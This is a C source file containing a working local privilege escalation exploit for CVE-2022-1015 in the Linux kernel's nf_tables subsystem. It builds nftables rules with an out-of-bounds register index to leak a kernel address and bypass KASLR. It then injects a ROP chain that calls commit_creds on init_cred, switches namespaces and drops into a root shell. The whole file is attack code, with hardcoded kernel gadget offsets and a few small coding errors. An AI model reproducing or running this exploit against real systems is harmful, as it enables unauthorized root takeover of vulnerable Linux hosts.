#define _GNU_SOURCE
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <assert.h>
#include <inttypes.h>
#include <pthread.h>

#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define PREPARE_KERNEL_CRED (vmlinux + 0x96880)
#define INIT_CRED (vmlinux + 0x1850520)
#define COMMIT_CRED (vmlinux + 0x965d0)
#define POP_RDI (vmlinux + 0x1e64)
#define POP_RCX (vmlinux + 0x74e62)
#define POP_RSI (vmlinux + 0x210a)
#define MOV_RDI_RAX_REP_POP_RBX_POP_RBP_RET (vmlinux + 0xd64cdc)
#define SWITCH_TASK_NAMESPACES (vmlinux + 0x94c50)
#define FIND_TASK_BY_VPID (vmlinux + 0x8f360)
#define INIT_NSPROXY (vmlinux + 0x1850300)
#define swapgs_restore_regs_and_return_to_usermode (vmlinux + 0xe00e26)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_sp;
uint64_t vmlinux;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    INFO("Saved state");
}

typedef struct udp_data {
    char* data;
    size_t size;
    uint16_t port;
    char* addr;
    size_t addr_size;
} udp_data;

typedef struct listener_data {
    uint16_t port;
    char address[8];
} listener_data;

void write_to_file(const char* which, const char* format, ...)
{
    FILE* fu = fopen(which, "w");
    va_list args;
    va_start(args, format);
    if (vfprintf(fu, format, args) < 0) {
        perror("cannot write");
        exit(1);
    }
    fclose(fu);
}

void setup_user_and_network_ns(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        exit(EXIT_FAILURE);
    }

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
        perror("[-] sched_setaffinity");
        exit(EXIT_FAILURE);
    }

    // now we map uid and gid
    write_to_file("/proc/self/uid_map", "0 %d 1", uid);
    // deny setgroups (see user_namespaces(7))
    write_to_file("/proc/self/setgroups", "deny");
    // remap gid
    write_to_file("/proc/self/gid_map", "0 %d 1", gid);
}

static struct nftnl_table* table_add_parse(char* table_name)
{
    struct nftnl_table* t;
    uint16_t family = AF_INET;
    t = nftnl_table_alloc();
    if (t == NULL) {
        perror("[!] Couldn't allocate a table");
        exit(EXIT_FAILURE);
    }

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family); // set the family
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); // set the name

    return t;
}

static struct nftnl_chain* chain_add_parse(char* table_name, char* chain_name, int hooknum)
{
    struct nftnl_chain* t;

    t = nftnl_chain_alloc();
    if (t == NULL) {
        perror("[!] Couldn't allocate a chain");
        return NULL;
    }
    nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); // set priority to 0
    nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
    return t;
}

void setup_table_and_chain(char* table_name, char* base_chain_name, int hooknum)
{
    char buf_table[MNL_SOCKET_BUFFER_SIZE];
    char buf_chain[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr* nlh;
    uint32_t portid, t_seq, c_seq, table_seq, chain_seq, family;
    struct nftnl_table* t_table;
    struct nftnl_chain* t_chain;
    struct mnl_nlmsg_batch *batch_table, *batch_chain;
    int ret;

    // **** TABLE SETUP ****
    t_table = table_add_parse(table_name);
    t_seq = time(NULL);
    batch_table = mnl_nlmsg_batch_start(buf_table, sizeof(buf_table));
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch_table), t_seq++);

    mnl_nlmsg_batch_next(batch_table);
    table_seq = t_seq;
    family = nftnl_table_get_u32(t_table, NFTNL_TABLE_FAMILY);
    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_table),
        NFT_MSG_NEWTABLE, family,
        NLM_F_CREATE | NLM_F_ACK, t_seq++);
    nftnl_table_nlmsg_build_payload(nlh, t_table);
    nftnl_table_free(t_table);
    mnl_nlmsg_batch_next(batch_table);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch_table), t_seq++);
    mnl_nlmsg_batch_next(batch_table);

    // **** CHAIN SETUP ****
    c_seq = time(NULL);
    t_chain = chain_add_parse(table_name, base_chain_name, hooknum);
    batch_chain = mnl_nlmsg_batch_start(buf_chain, sizeof(buf_chain));
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch_chain), c_seq++);
    mnl_nlmsg_batch_next(batch_chain);
    chain_seq = c_seq;
    family = NFPROTO_IPV4;
    nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_chain),
        NFT_MSG_NEWCHAIN, family,
        NLM_F_CREATE | NLM_F_ACK, c_seq++);
    nftnl_chain_nlmsg_build_payload(nlh, t_chain);
    nftnl_chain_free(t_chain);
    mnl_nlmsg_batch_next(batch_chain);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch_chain), c_seq++);
    mnl_nlmsg_batch_next(batch_chain);

    // *** SETTING UP THE SOCKET ***
    struct mnl_socket* nl_soc = mnl_socket_open(NETLINK_NETFILTER);
    if (nl_soc == NULL) {
        ERROR("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0) {
        ERROR("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    INFO("Socket is opened.");

    portid = mnl_socket_get_portid(nl_soc);

    // *** SENDING TABLE BATCH ***
    if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_table),
            mnl_nlmsg_batch_size(batch_table))
        < 0) {
        ERROR("mnl_socket_send *table*");
        exit(EXIT_FAILURE);
    }
    mnl_nlmsg_batch_stop(batch_table);

    ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
    while (ret > 0) {
        ret = mnl_cb_run(buf_table, ret, table_seq, portid, NULL, NULL);
        if (ret <= 0)
            break;
        ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
    }

    if (ret == -1) {
        ERROR("Error adding table");
        exit(EXIT_FAILURE);
    }
    INFO("Table %s created.", table_name);

    // *** SENDING CHAIN BATCH ***
    if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_chain),
            mnl_nlmsg_batch_size(batch_chain))
        < 0) {
        ERROR("mnl_socket_send *chain*");
        exit(EXIT_FAILURE);
    }
    mnl_nlmsg_batch_stop(batch_chain);

    ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
    while (ret > 0) {
        ret = mnl_cb_run(buf_chain, ret, chain_seq, portid, NULL, NULL);
        if (ret <= 0)
            break;
        ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
    }

    if (ret == -1) {
        ERROR("Error adding chain");
        exit(EXIT_FAILURE);
    }
    INFO("Chain %s created.", base_chain_name);

    mnl_socket_close(nl_soc);
}

static void add_payload(struct nftnl_rule* r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("payload");

    if (e == NULL) {
        ERROR("expr payload oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);

    nftnl_rule_add_expr(r, e);
}

static void add_payload_set(struct nftnl_rule* r, uint32_t base, uint32_t offset, uint32_t len, uint32_t sreg)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("payload");

    if (e == NULL) {
        ERROR("expr payload set oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTA_PAYLOAD_BASE, base);
    nftnl_expr_set_u32(e, NFTA_PAYLOAD_OFFSET, offset);
    nftnl_expr_set_u32(e, NFTA_PAYLOAD_LEN, len);
    nftnl_expr_set_u32(e, NFTA_PAYLOAD_SREG, sreg);
    nftnl_expr_set_u32(e, NFTA_PAYLOAD_CSUM_TYPE, NFT_PAYLOAD_CSUM_NONE);

    nftnl_rule_add_expr(r, e);
}

static void add_cmp(struct nftnl_rule* r, uint32_t op, uint32_t sreg, void* data, size_t data_len)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("cmp");

    if (e == NULL) {
        ERROR("expr cmp oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
    nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
    nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

    nftnl_rule_add_expr(r, e);
}

static void set_verdict(struct nftnl_rule* r, uint32_t verdict)
{
    struct nftnl_expr* e;
    e = nftnl_expr_alloc("immediate");

    if (e == NULL) {
        ERROR("expr immediate oom");
        exit(EXIT_FAILURE);
    }

    nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); // 0 is verdict register
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); // send the verdict
    nftnl_rule_add_expr(r, e);
}

static struct nftnl_rule* setup_leak_address_rule(uint8_t family, const char* table,
    const char* chain, uint16_t port)
{
    struct nftnl_rule* r = NULL;

    r = nftnl_rule_alloc();
    if (r == NULL) {
        ERROR("Couldn't allocate a rule");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    // *** CHECK PORT TO REDUCE NOISE ***
    // first we have to copy the port into a register
    // important: the destination port is at offset 2 bytes of the udp header
    // the port's size is also 2 bytes
    // we will copy it to (small) register 1
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);

    // now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
    uint16_t port_net = htons(port); // we have to convert from little-endian to big
    add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof port_net);

    // *** PREPARE PAYLOAD SET EXPRESSION ***
    // This expression will be used to get the address from a out-of-bound register and write it into the packet
    uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
    uint32_t payload_offset = 8; // we set the offset to after the UDP header.
    uint32_t payload_len = 0xff;
    uint32_t payload_sreg = 0xffffffca + 0x4;

    add_payload_set(r, payload_base, payload_offset, payload_len, payload_sreg);
    INFO("Payload expression is setup!");

    // *** SET THE VERDICT TO CONTINUE ***
    set_verdict(r, NFT_CONTINUE);
    INFO("Verdict is setup!");

    return r;
}

static struct nftnl_rule* setup_rop_chain_rules(uint8_t family, const char* table_name, const char* chain_name, uint16_t port)
{
    struct nftnl_rule* r = NULL;
    r = nftnl_rule_alloc();

    if (r == NULL) {
        ERROR("Couldn't allocate a rule");
        exit(EXIT_FAILURE);
    }

    nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

    // *** CHECK PORT TO REDUCE NOISE ***
    // first we have to copy the port into a register
    // important: the destination port is at offset 2 bytes of the udp header
    // the port's size is also 2 bytes
    // we will copy it to (small) register 1
    add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);

    // now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
    uint16_t port_net = htons(port); // we have to convert from little-endian to big
    add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof port_net);

    /* RULE TO COPY THE ROP CHAIN */
    uint32_t payload_base = NFT_PAYLOAD_TRANSPORT_HEADER;
    uint32_t payload_offset = 8; // we set the offset to after the UDP header.
    uint32_t payload_len = 0xff; // 8 bytes -> the address
    uint32_t payload_dreg = 0xffffffca + 0x4;

    add_payload(r, payload_base, payload_offset, payload_len, payload_dreg);

    // *** SET THE VERDICT TO CONTINUE ***
    set_verdict(r, NF_ACCEPT);
    return r;
}

void add_rule(struct nftnl_rule* r)
{
    struct mnl_socket* nl_soc;
    struct nlmsghdr* nlh;
    struct mnl_nlmsg_batch* batch;
    uint8_t family;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = time(NULL);
    int ret;

    family = NFPROTO_IPV4;

    nl_soc = mnl_socket_open(NETLINK_NETFILTER);
    if (nl_soc == NULL) {
        ERROR("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0) {
        ERROR("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, r);
    nftnl_rule_free(r);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    ret = mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch),
        mnl_nlmsg_batch_size(batch));
    if (ret == -1) {
        ERROR("mnl_socket_sendto *rule*");
        exit(EXIT_FAILURE);
    }

    mnl_nlmsg_batch_stop(batch);

    ret = mnl_socket_recvfrom(nl_soc, buf, sizeof(buf));
    if (ret == -1) {
        ERROR("mnl_socket_recvfrom");
        exit(EXIT_FAILURE);
    }

    ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_soc), NULL, NULL);
    if (ret < 0) {
        ERROR("mnl_cb_run: add_rule");
        exit(EXIT_FAILURE);
    }

    mnl_socket_close(nl_soc);
}

void* send_udp_packet(void* arg)
{
    // first lets sleep for a second to wait for the listener to be setup
    sleep(0.5);
    udp_data* udata = (udp_data*)arg;
    size_t size = udata->size;
    char* data = udata->data;
    uint16_t port = udata->port;
    char* dest_addr = udata->addr;

    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(dest_addr);

    sendto(sock, data, size, 0, (struct sockaddr*)&addr, sizeof(addr));

    close(sock);

    pthread_exit(NULL);
}

void* receive_address(void* arg)
{
    listener_data* ldata = (listener_data*)arg;
    uint16_t port = ldata->port;

    char message[0x100];
    bzero(message, sizeof(message));
    int bytes;
    int ret;

    int soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    if (soc < 0) {
        perror("[!] Error setting up UDP socket");
        exit(EXIT_FAILURE);
    }

    int reuse_address = 1;

    setsockopt(soc, SOL_SOCKET, SO_REUSEADDR, &reuse_address, sizeof reuse_address);

    struct sockaddr_in addr;
    inet_aton("127.0.0.1", &addr.sin_addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    ret = bind(soc, (struct sockaddr*)&addr, sizeof(addr));
    if (ret < 0) {
        ERROR("Problem binding");
        exit(EXIT_FAILURE);
    }
    INFO("Listening on port %d", port);
    bytes = recvfrom(soc, (char*)message, sizeof message, MSG_WAITALL, (struct sockaddr*)&addr, sizeof(addr));
    message[bytes] = '\0';
    // for (int i = 0; i < sizeof(message) / 8; i++) {
    //     printf("%lx\n", *(unsigned long *)(message + i*8));
    // }
    memcpy(&ldata->address, message, 8);
    pthread_exit(NULL);
}

void win()
{
    INFO("*ROOT*");
    system("id");
    system("/bin/sh");
}

int main()
{
    INFO("CVE-2022-1015 LPE Exploit by @longhh");
    system("id");

    save_state();

    pid_t process_id = getpid(); // pid will not be changed by namespace creation
    struct nftnl_rule* r;

    INFO("Setting up user+network namespace sandbox");
    setup_user_and_network_ns();
    system("ip link set dev lo up"); // setting the loopback up

    INFO("STAGE 1: KASLR bypass");
    char *leak_table_name = "leak_table",
         *leak_base_chain_name = "output_chain";

    // first setup the table and chain with output hook
    setup_table_and_chain(leak_table_name, leak_base_chain_name, NF_INET_LOCAL_OUT);

    uint16_t port = 50005;

    // we setup the rules that will allow us to leak the address
    r = setup_leak_address_rule(NFPROTO_IPV4, leak_table_name, leak_base_chain_name, port); // create rule
    add_rule(r); // submit rule
    INFO("Address leak rule created!");

    // send thread
    pthread_t thread_id_send;
    struct udp_data dummy_data;
    char As[0x100];
    memset(As, 'A', 0x100);
    char* dest_addr = "127.0.0.1";
    dummy_data.data = As;
    dummy_data.size = sizeof(As) / sizeof(char);
    dummy_data.port = port;
    dummy_data.addr = dest_addr;
    dummy_data.addr_size = sizeof(dummy_data.addr);
    pthread_create(&thread_id_send, NULL, send_udp_packet, (void*)&dummy_data);

    // recv thread
    struct listener_data ldata;
    ldata.port = port;
    bzero(ldata.address, 8);
    pthread_t thread_id_receive;
    pthread_create(&thread_id_receive, NULL, receive_address, (void*)&ldata);

    INFO("Packet sent... if no output in a second - it has failed");
    pthread_join(thread_id_send, NULL);
    pthread_join(thread_id_receive, NULL);

    INFO("Leaked Address: 0x%lx", *(uint64_t*)ldata.address);
    vmlinux = *(uint64_t*)ldata.address - 0xb23d9a;
    INFO("Leaked vmlinux base: 0xlx", vmlinux);

    /* ROP STAGE */
    uint16_t rop_port = 50006; // we set another port for the rop triggering stage

    char *rop_table_name = "rop_table",
         *rop_base_chain_name = "output_chain";

    INFO("STAGE 2: Escalation");

    setup_table_and_chain(rop_table_name, rop_base_chain_name, NF_INET_LOCAL_OUT);
    r = setup_rop_chain_rules(NFPROTO_IPV4, rop_table_name, rop_base_chain_name, rop_port); // create rule
    add_rule(r);

    INFO("Copy ROP-to-stack rules created.");

    // send thread
    memset(As, 'A', 0x100);

    uint64_t* chain = (uint64_t*)As;
    *chain++ = POP_RDI;
    *chain++ = INIT_CRED;
    *chain++ = COMMIT_CRED;
    *chain++ = POP_RDI;
    *chain++ = process_id;
    *chain++ = FIND_TASK_BY_VPID;
    *chain++ = POP_RCX;
    *chain++ = 0;
    *chain++ = MOV_RDI_RAX_REP_POP_RBX_POP_RBP_RET;
    *chain++ = 0; // dummy rbx
    *chain++ = 0; // dummy rbp
    *chain++ = POP_RSI;
    *chain++ = INIT_NSPROXY;
    *chain++ = SWITCH_TASK_NAMESPACES;
    *chain++ = swapgs_restore_regs_and_return_to_usermode;
    *chain++ = 0; // dummy rax
    *chain++ = 0; // dummy rdi
    *chain++ = (unsigned long)win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_sp;
    *chain++ = user_ss;

    dummy_data.data = As;
    dummy_data.size = sizeof(As) / sizeof(char);
    dummy_data.port = rop_port;
    dummy_data.addr = dest_addr;
    dummy_data.addr_size = sizeof(dummy_data.addr);
    pthread_create(&thread_id_send, NULL, send_udp_packet, (void*)&dummy_data);

    // recv thread
    ldata.port = rop_port;
    bzero(ldata.address, 8);
    pthread_create(&thread_id_receive, NULL, receive_address, (void*)&ldata);

    INFO("Packet sent... if no output in a second - it has failed");
    pthread_join(thread_id_send, NULL);
    pthread_join(thread_id_receive, NULL);

    return 0;
}